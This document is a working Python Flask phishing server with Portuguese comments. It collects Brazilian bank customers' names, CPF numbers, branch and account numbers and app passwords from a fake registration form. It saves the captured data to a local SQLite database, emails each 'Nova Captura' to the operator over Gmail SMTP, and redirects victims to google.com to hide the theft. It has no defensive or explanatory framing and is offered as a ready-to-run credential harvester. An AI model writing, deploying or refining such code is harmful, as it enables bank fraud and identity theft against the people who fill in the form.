import os
import smtplib
import sqlite3
from email.mime.text import MIMEText
from flask import Flask, render_template, request, redirect

app = Flask(__name__, template_folder='templates')

# --- CONFIGURAÇÃO ---
EMAIL_REMETENTE = "seu-email@gmail.com"
SENHA_APP = "sua-senha-de-16-digitos" 
EMAIL_DESTINO = "seu-email@gmail.com"

def enviar_aviso(dados):
    corpo = f"Nova Captura: {dados['nome']} - CPF: {dados['cpf']} - Senha: {dados['senha_app']}"
    msg = MIMEText(corpo)
    msg['Subject'] = '🔔 Nova Captura!'
    msg['From'] = EMAIL_REMETENTE
    msg['To'] = EMAIL_DESTINO

    try:
        # Adicionado timeout de 5 segundos para não travar o site
        with smtplib.SMTP_SSL('smtp.gmail.com', 465, timeout=5) as server:
            server.login(EMAIL_REMETENTE, SENHA_APP)
            server.sendmail(EMAIL_REMETENTE, EMAIL_DESTINO, msg.as_string())
    except Exception as e:
        print(f"Erro no e-mail (site seguiu adiante): {e}")

@app.route('/')
def index():
    return render_template('cadastro.html')

@app.route('/login', methods=['POST'])
def login():
    dados = {
        'nome': request.form.get('nome'),
        'cpf': request.form.get('cpf'),
        'agencia': request.form.get('agencia'),
        'conta': request.form.get('conta'),
        'senha_app': request.form.get('senha_app')
    }
    
    # Salva no Banco de Dados primeiro (Garante que você tenha o dado)
    try:
        conn = sqlite3.connect('dados_bancarios.db')
        cursor = conn.cursor()
        cursor.execute('INSERT INTO usuarios (nome, cpf, agencia, conta, senha_app) VALUES (?,?,?,?,?)', 
                       (dados['nome'], dados['cpf'], dados['agencia'], dados['conta'], dados['senha_app']))
        conn.commit()
        conn.close()
    except:
        pass

    # Tenta enviar e-mail sem travar a navegação
    enviar_aviso(dados)
    
    return redirect("https://www.google.com")

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)




